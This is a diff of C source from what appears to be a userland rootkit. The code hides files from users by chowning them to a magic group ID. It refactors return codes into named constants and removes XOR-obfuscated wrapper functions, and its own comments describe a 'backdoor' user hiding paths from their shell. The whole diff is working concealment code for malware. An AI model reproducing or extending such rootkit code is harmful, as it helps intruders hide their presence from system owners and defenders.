@@ -15,6 +15,9 @@ gid_t get_fd_gid(int fd);
 gid_t get_fd_gid64(int fd);
 #include "get_path_gid.c"
 
+#define MODE_REG 0x32  /* STAT MODE FOR REGULAR FILES. */
+#define MODE_64 0x64   /* STAT MODE FOR BIG FILES. */
+
 int _hidden_path(const char *pathname, int mode);
 int _f_hidden_path(int fd, int mode);
 int _l_hidden_path(const char *pathname, int mode);
@@ -33,13 +36,17 @@ int chown_path(char *path, gid_t gid){
     return (long)call(CCHOWN, path, 0, gid);
 }
 
+#define PATH_ERR -1  /* error codes for when the backdoor */
+#define PATH_DONE 1  /* user is trying to hide paths from */
+#define PATH_SUCC 0  /* their shell. */
+
 int hide_path(char *path){
 #ifndef HIDE_SELF
     return 0;
 #endif
 
-    if(not_user(0)) return -1;
-    if(hidden_path(path)) return 1;
+    if(not_user(0)) return PATH_ERR;
+    if(hidden_path(path)) return PATH_DONE;
     return chown_path(path, MAGIC_GID);
 }
 
@@ -48,33 +55,9 @@ int unhide_path(char *path){
     return 0;
 #endif
 
-    if(not_user(0)) return -1;
-    if(!hidden_path(path)) return 1;
+    if(not_user(0)) return PATH_ERR;
+    if(!hidden_path(path)) return PATH_DONE;
     return chown_path(path, 0);
-}
-
-int xhide_path(const char *path){
-#ifndef HIDE_SELF
-    return 0;
-#endif
-
-    int ret;
-    xor(_path, path);
-    ret = hide_path(_path);
-    clean(_path);
-    return ret;
-}
-
-int xunhide_path(const char *path){
-#ifndef HIDE_SELF
-    return 0;
-#endif
-
-    int ret;
-    xor(_path, path);
-    ret = unhide_path(_path);
-    clean(_path);
-    return ret;
 }
 
 #endif
